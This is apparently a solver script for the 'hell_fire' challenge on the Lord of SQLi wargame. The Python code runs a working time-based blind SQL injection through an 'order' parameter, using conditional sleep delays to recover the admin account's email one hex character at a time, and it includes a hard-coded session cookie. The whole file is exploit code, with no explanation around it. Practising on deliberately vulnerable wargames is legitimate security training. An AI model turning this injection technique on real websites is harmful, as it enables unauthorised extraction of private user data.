# LordofSQLi: hell_fire
# woanmeo11

import requests
from binascii import unhexlify

url = 'https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php'
cookies = {'PHPSESSID': '3m98meqfegcllfpdosp64m7n95'}
charset = '0123456789abcdef'
hex_ans = ''

finish = False
while not finish:
    finish = True
    for c in charset:
        payload = {'order': f"(if(id='admin' && hex(email) like '{hex_ans + c}%',sleep(2),1))"}
        r = requests.get(url, params=payload, cookies=cookies)

        print(f'{c}: {r.elapsed.seconds}s')
        if r.elapsed.seconds >= 2:
            hex_ans += c
            finish = False
            print('->' + hex_ans)
            break
print('->' + hex_ans)
print('->' + unhexlify(hex_ans).decode())
